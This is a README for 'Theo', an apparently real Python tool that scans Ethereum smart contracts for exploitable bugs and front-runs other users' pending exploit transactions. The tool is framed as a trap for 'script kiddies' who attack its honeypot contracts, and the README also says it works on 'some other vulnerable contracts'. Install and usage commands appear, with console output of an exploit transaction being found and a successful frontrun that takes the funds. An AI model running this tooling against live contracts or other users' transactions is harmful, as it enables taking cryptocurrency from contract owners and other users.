# Theo

Theo is a great hacker showing the other script kiddies how things should be done.

![Theo](./static/theo-profile.png)

He knows [Karl](https://github.com/cleanunicorn/karl) from work.

Theo's purpose is to fight script kiddies that try to be leet hackers. He can listen to them trying to exploit his honeypots and make them lose their funds, for his own gain.

## Install

```console
$ git clone https://github.com/cleanunicorn/theo
$ cd theo
$ pip install -r requirements.txt
```

It's recommended to use [virtualenv](https://virtualenv.pypa.io/en/latest/) if you're familiar with it.

Requirements: 

- Python 3.5 or higher
- An Ethereum node with RPC available
- Accounts unlocked to be able to send transactions

## Demo

[Scrooge McEtherface](https://github.com/b-mueller/scrooge-mcetherface) tries to exploit a contract but Theo is able to successfully frontrun him.

[![asciicast](https://asciinema.org/a/KVbZpYZee39eWavEwiXMaemPI.svg)](https://asciinema.org/a/KVbZpYZee39eWavEwiXMaemPI)

## Usage

Start a session by running:

```console
$ python ./theo.py tx-pool --attacker=<your unlocked account> --contract=<honeypot>
```

It will analyze the contract and will find a list of available exploits.

```console
$ python theo.py tx-pool --attacker=0xffcf8fdee72ac11b5c542428b35eef5769c409f0 --contract=0xd833215cbcc3f914bd1c9ece3ee7bf8b14f841bb                                          
Scanning for exploits in contract: 0xd833215cbcc3f914bd1c9ece3ee7bf8b14f841bb
Found exploit(s) [Exploit: (txs=[Transaction: {'input': '0xcf7a8965', 'value': '0xde0b6b3a7640000'}])]
Python 3.7.3 (default, Jun 24 2019, 04:54:02) 
[GCC 9.1.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
(InteractiveConsole)
>>>
```

You can see the available exploits found. In this case one exploit was found. Each exploit is an [Exploit](https://github.com/cleanunicorn/theo/blob/263dc9f0cd34c4a0904529128c93f30b29eae415/theo/scanner/__init__.py#L9) object, having a list of transactions to exploit a bug.

```console
>>> exploits[0]
Exploit: (txs=[Transaction: {'input': '0xcf7a8965', 'value': '0xde0b6b3a7640000'}])
```

You can start the frontrunning monitor to listen for other hackers (script kiddies really) trying to exploit his honeypots.

Use `.frontrun()` to start listening for the exploit and when found send a transaction with a higher gas price.

```console
>>> exploits[0].frontrun()
Waiting for a victim to reach into the honey jar.
Listening for Transaction: {'input': '0xcf7a8965', 'value': '0xde0b6b3a7640000'}.
Found pending tx: 0x74eb78557b4659f27e7a8b82804ae97be9d0adfefd6a5652a097045f6de77a0b from: 0x1df62f291b2e969fb0849d99d9ce41e2f137006e.
Frontrunning with tx: {'from': '0xffcf8fdee72ac11b5c542428b35eef5769c409f0', 'to': '0xd833215cbcc3f914bd1c9ece3ee7bf8b14f841bb', 'gasPrice': '0x3b9aca01', 'input': '0xcf7a8965', 'gas': '0x4c4b40', 'value': '0xde0b6b3a7640000'}
Mined transaction: 0x0b5e7ceedd600eaf013ca8bc74900e6d29b25ed422baaa776f42bec01870a288
```

> "Oh, my God! The quarterback is toast!"

This works very well for some specially crafted [contracts](./contracts/) or some other vulnerable contracts, as long as you make sure frontrunning is in your favor.
